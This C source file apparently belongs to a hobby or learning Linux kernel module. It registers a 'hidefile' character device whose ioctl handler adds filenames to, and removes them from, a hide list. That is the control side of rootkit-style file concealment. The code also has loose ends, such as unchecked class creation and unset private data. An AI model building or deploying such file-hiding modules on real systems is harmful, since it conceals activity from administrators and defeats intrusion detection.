#include <linux/kernel.h>  /* printk */
#include <linux/uaccess.h> /* strncpy_from_user, strnlen_user */
#include <linux/slab.h>    /* kmalloc, kfree */
#include "driver.h"        /* HIDEFILE_MAJOR, MAX_HIDEFILE_MINOR, hidefile_operation, hidefile_device_data */
#include "idanm.h"         /* add_file_to_hide, remove_file_from_list, MAX_DIRENT_NAME_LEN */

/* Global variables */
struct hidefile_device_data *device = NULL;
static struct class *hidefile_class = NULL;

static int hidefile_open(struct inode *inode, struct file *file)
{
    return 0;
}

static ssize_t hidefile_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    return 0;
}

static ssize_t hidefile_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    return 0;
}

static int hidefile_release(struct inode *inode, struct file *file)
{
    file->private_data = NULL;
    return 0;
}

static long hidefile_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct hidefile_device_data *d_data;
    char *filename;

    pr_info("Idan's module got ioctl command");

    d_data = (struct hidefile_device_data *)file->private_data;
    switch (cmd)
    {
    case HIDEFILE_OP_ADD:
        filename = (char *)kmalloc(MAX_DIRENT_NAME_LEN, GFP_KERNEL);
        if (!filename)
        {
            pr_err("Idan's module failed to allocate filename");
            return -ENOMEM;
        }
        if (strncpy_from_user(filename, (char __user *)arg, strnlen_user((char __user *)arg, MAX_DIRENT_NAME_LEN)) <= 0)
        {
            pr_err("Idan's module failed to copy from user");
            kfree(filename);
            return -EFAULT;
        }
        add_file_to_hide(filename);
        break;
    case HIDEFILE_OP_REMOVE:
        filename = (char *)kmalloc(MAX_DIRENT_NAME_LEN, GFP_KERNEL);
        if (!filename)
        {
            pr_err("Idan's module failed to allocate filename");
            return -ENOMEM;
        }
        if (strncpy_from_user(filename, (char __user *)arg, strnlen_user((char __user *)arg, MAX_DIRENT_NAME_LEN)) <= 0)
        {
            pr_err("Idan's module failed to copy from user");
            kfree(filename);
            return -EFAULT;
        }
        remove_file_from_list(filename);
        break;
    default:
        return -EINVAL;
    }

    return 0;
}

const struct file_operations hidefile_ops = {
    .owner = THIS_MODULE,
    .open = hidefile_open,
    .read = hidefile_read,
    .write = hidefile_write,
    .release = hidefile_release,
    .unlocked_ioctl = hidefile_ioctl};

int init_driver(void)
{
    int err = 0;
    void *device_ptr = NULL;

    err = register_chrdev_region(MKDEV(HIDEFILE_MAJOR, 0), MAX_HIDEFILE_MINOR, "hidefile_driver");

    if (err < 0)
    {
        pr_err("Idan's module failed to register a major number");
        return err;
    }

    device = kmalloc(sizeof(struct hidefile_device_data), GFP_KERNEL);
    if (!device)
    {
        pr_err("Idan's module failed to allocate device data");
        unregister_chrdev_region(MKDEV(HIDEFILE_MAJOR, 0), MAX_HIDEFILE_MINOR);
        return -ENOMEM;
    }

    cdev_init(&device->cdev, &hidefile_ops);
    err = cdev_add(&device->cdev, MKDEV(HIDEFILE_MAJOR, 0), MAX_HIDEFILE_MINOR);

    if (err < 0)
    {
        pr_err("Idan's module failed to add a character device");
        kfree(device);
        unregister_chrdev_region(MKDEV(HIDEFILE_MAJOR, 0), MAX_HIDEFILE_MINOR);
        return err;
    }

    hidefile_class = class_create(THIS_MODULE, "hidefile_class");

    device_ptr = device_create(hidefile_class, NULL, MKDEV(HIDEFILE_MAJOR, 0), NULL, "hidefile");
    if (IS_ERR(device_ptr))
    {
        pr_err("Idan's module failed to create a device");
        class_unregister(hidefile_class);
        class_destroy(hidefile_class);
        cdev_del(&device->cdev);
        kfree(device);
        unregister_chrdev_region(MKDEV(HIDEFILE_MAJOR, 0), MAX_HIDEFILE_MINOR);
        return -ENOMEM;
    }

    return 0;
}

void cleanup_driver(void)
{
    device_destroy(hidefile_class, MKDEV(HIDEFILE_MAJOR, 0));
    class_unregister(hidefile_class);
    class_destroy(hidefile_class);
    cdev_del(&device->cdev);

    kfree(device);
    unregister_chrdev_region(MKDEV(HIDEFILE_MAJOR, 0), MAX_HIDEFILE_MINOR);
}